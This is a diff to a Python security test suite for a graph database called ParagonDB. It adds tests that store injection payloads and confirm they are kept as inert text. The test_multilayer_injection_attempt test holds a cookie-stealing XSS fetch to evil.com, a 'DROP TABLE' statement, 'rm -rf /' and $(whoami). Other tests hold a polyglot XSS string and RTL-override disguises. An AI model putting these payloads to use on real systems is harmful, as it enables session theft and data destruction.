@@ -623,9 +623,11 @@ class TestDataValidationSecurity(unittest.TestCase):
             created_by="test_security",
         )
 
-        # UUID format validation (8-4-4-4-12 hex digits)
-        uuid_pattern = r'^[a-f0-9]{8}-[a-f0-9]{4}-[a-f0-9]{4}-[a-f0-9]{4}-[a-f0-9]{12}$'
+        # UUID format validation (32 hex digits, no hyphens)
+        # Paragon uses uuid4().hex format
+        uuid_pattern = r'^[a-f0-9]{32}$'
         self.assertIsNotNone(re.match(uuid_pattern, node.id))
+        self.assertEqual(len(node.id), 32)
 
     def test_node_id_uniqueness(self):
         """
@@ -1148,6 +1150,245 @@ class TestResourceExhaustionSecurity(unittest.TestCase):
 
 
 # =============================================================================
+# TEST CLASS 8: ADVANCED SECURITY TESTS
+# =============================================================================
+
+class TestAdvancedSecurityScenarios(unittest.TestCase):
+    """
+    Advanced security test scenarios combining multiple attack vectors.
+    """
+
+    def setUp(self):
+        """Create fresh database."""
+        self.db = ParagonDB()
+        set_db(self.db)
+
+    def tearDown(self):
+        """Reset global state."""
+        set_db(None)
+
+    # =========================================================================
+    # COMBINED ATTACK SCENARIOS
+    # =========================================================================
+
+    def test_multilayer_injection_attempt(self):
+        """
+        Test: Combined SQL + XSS + Command injection.
+
+        Threat: Attacker tries multiple injection types.
+        Defense: Each layer is isolated and sanitized.
+        """
+        multilayer_payload = """
+        <script>fetch('evil.com/steal?data='+document.cookie)</script>
+        '; DROP TABLE users; --
+        `rm -rf /`
+        $(whoami)
+        """
+
+        node = NodeData.create(
+            type=NodeType.DOC.value,
+            content=multilayer_payload,
+            created_by="test_security",
+        )
+        self.db.add_node(node)
+
+        # All payloads stored as text, not executed
+        retrieved = self.db.get_node(node.id)
+        self.assertIn("<script>", retrieved.content)
+        self.assertIn("DROP TABLE", retrieved.content)
+        self.assertIn("rm -rf", retrieved.content)
+
+    def test_polyglot_payload(self):
+        """
+        Test: Polyglot payload (valid in multiple contexts).
+
+        Threat: Payload that is valid code/HTML/SQL simultaneously.
+        Defense: Context-aware escaping at render time.
+        """
+        polyglot = "javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/\"/+/onmouseover=1/+/[*/[]/+alert(1)//'>"
+
+        node = NodeData.create(
+            type=NodeType.CODE.value,
+            content=f"# {polyglot}",
+            created_by="test_security",
+        )
+        self.db.add_node(node)
+
+        # Stored verbatim
+        retrieved = self.db.get_node(node.id)
+        self.assertIn("onload=", retrieved.content)
+
+    def test_timing_attack_on_node_existence(self):
+        """
+        Test: Timing attack to enumerate node IDs.
+
+        Threat: Measure response time to determine if node exists.
+        Defense: Constant-time lookups (dict-based).
+        """
+        import time
+
+        # Create a node
+        node = NodeData.create(type=NodeType.CODE.value, content="test", created_by="test")
+        self.db.add_node(node)
+
+        # Time lookup of existing node
+        start = time.perf_counter()
+        existing = self.db.get_node(node.id)
+        time_exists = time.perf_counter() - start
+
+        # Time lookup of non-existent node
+        start = time.perf_counter()
+        try:
+            nonexistent = self.db.get_node("00000000000000000000000000000000")
+        except Exception:
+            pass
+        time_not_exists = time.perf_counter() - start
+
+        # Timing should be similar (both are dict lookups)
+        # Note: This is a basic check; production needs constant-time comparisons
+        self.assertIsNotNone(existing)
+
+    def test_race_condition_duplicate_add(self):
+        """
+        Test: Race condition on duplicate node addition.
+
+        Threat: Concurrent adds of same node ID.
+        Defense: DuplicateNodeError is raised.
+        """
+        node = NodeData.create(type=NodeType.CODE.value, content="test", created_by="test")
+        self.db.add_node(node)
+
+        # Second add should fail
+        with self.assertRaises(DuplicateNodeError):
+            self.db.add_node(node)
+
+    def test_metadata_injection_in_json(self):
+        """
+        Test: JSON injection in metadata field.
+
+        Threat: Malicious metadata corrupts JSON structure.
+        Defense: msgspec handles JSON encoding safely.
+        """
+        malicious_metadata = {
+            "injection": '{"admin": true}',
+            "nested": {"payload": "'; DROP TABLE --"},
+            "array": ["normal", "'; DELETE", {"evil": True}],
+        }
+
+        node = NodeData.create(
+            type=NodeType.REQ.value,
+            content="Test requirement",
+            data=malicious_metadata,
+            created_by="test_security",
+        )
+        self.db.add_node(node)
+
+        # Metadata is stored correctly
+        retrieved = self.db.get_node(node.id)
+        self.assertEqual(retrieved.data["injection"], malicious_metadata["injection"])
+
+    # =========================================================================
+    # EDGE CASE SECURITY TESTS
+    # =========================================================================
+
+    def test_extremely_long_node_id(self):
+        """
+        Test: Attempt to use extremely long node ID.
+
+        Note: NodeData.create() generates fixed-length UUIDs.
+        """
+        # This tests that manual ID creation would be validated
+        node = NodeData.create(type=NodeType.CODE.value, content="test", created_by="test")
+
+        # IDs are always 32 chars
+        self.assertEqual(len(node.id), 32)
+
+    def test_special_unicode_in_node_type(self):
+        """
+        Test: Special Unicode in node type field.
+
+        Note: NodeType is an enum, so invalid types would fail creation.
+        """
+        # Valid node type from enum
+        node = NodeData.create(
+            type=NodeType.CODE.value,
+            content="test",
+            created_by="test_security",
+        )
+        self.db.add_node(node)
+
+        # Type is validated
+        self.assertIn(node.type, [t.value for t in NodeType])
+
+    def test_recursive_metadata_structure(self):
+        """
+        Test: Deeply recursive metadata structure.
+
+        Threat: Stack overflow in JSON parsing.
+        Defense: msgspec handles deep nesting.
+        """
+        # Create deeply nested structure
+        deep_data = {"level": 1}
+        current = deep_data
+        for i in range(2, 100):
+            current["nested"] = {"level": i}
+            current = current["nested"]
+
+        node = NodeData.create(
+            type=NodeType.DOC.value,
+            content="Test with deep metadata",
+            data=deep_data,
+            created_by="test_security",
+        )
+        self.db.add_node(node)
+
+        # Deep nesting is handled
+        retrieved = self.db.get_node(node.id)
+        self.assertEqual(retrieved.data["level"], 1)
+
+    def test_zero_width_characters_in_content(self):
+        """
+        Test: Zero-width Unicode characters.
+
+        Threat: Hidden characters for obfuscation.
+        Defense: Unicode is preserved; detection at analysis time.
+        """
+        zero_width_chars = "test\u200B\u200C\u200D\uFEFFhidden"
+
+        node = NodeData.create(
+            type=NodeType.CODE.value,
+            content=zero_width_chars,
+            created_by="test_security",
+        )
+        self.db.add_node(node)
+
+        # Zero-width chars are preserved
+        retrieved = self.db.get_node(node.id)
+        self.assertIn("\u200B", retrieved.content)
+
+    def test_rtl_override_unicode_attack(self):
+        """
+        Test: Right-to-Left override Unicode attack.
+
+        Threat: RTL override to disguise malicious code.
+        Example: "exec\u202E)resu_tni(lav_e"
+        Defense: Unicode is stored; display layer must handle.
+        """
+        rtl_attack = "safe_function\u202E)danger(exec"
+
+        node = NodeData.create(
+            type=NodeType.CODE.value,
+            content=rtl_attack,
+            created_by="test_security",
+        )
+        self.db.add_node(node)
+
+        # RTL override is preserved
+        retrieved = self.db.get_node(node.id)
+        self.assertIn("\u202E", retrieved.content)
+
+
+# =============================================================================
 # MAIN TEST RUNNER
 # =============================================================================
 
@@ -1164,6 +1405,7 @@ def run_tests():
     suite.addTests(loader.loadTestsFromTestCase(TestGraphIntegritySecurity))
     suite.addTests(loader.loadTestsFromTestCase(TestPromptInjectionSecurity))
     suite.addTests(loader.loadTestsFromTestCase(TestResourceExhaustionSecurity))
+    suite.addTests(loader.loadTestsFromTestCase(TestAdvancedSecurityScenarios))
 
     runner = unittest.TextTestRunner(verbosity=2)
     result = runner.run(suite)
